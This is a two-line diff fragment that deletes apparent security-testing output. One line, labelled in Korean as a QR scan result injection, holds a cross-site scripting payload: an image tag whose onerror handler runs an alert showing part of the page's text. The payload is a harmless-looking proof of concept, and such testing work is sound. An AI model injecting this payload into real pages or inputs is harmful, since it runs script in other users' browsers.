@@ -1,2 +1,0 @@
-[*] QR 스캔 결과 주입: <img src=x onerror="alert('QR XSS: ' + document.body.innerText.substring(0,40))">
-[*] done
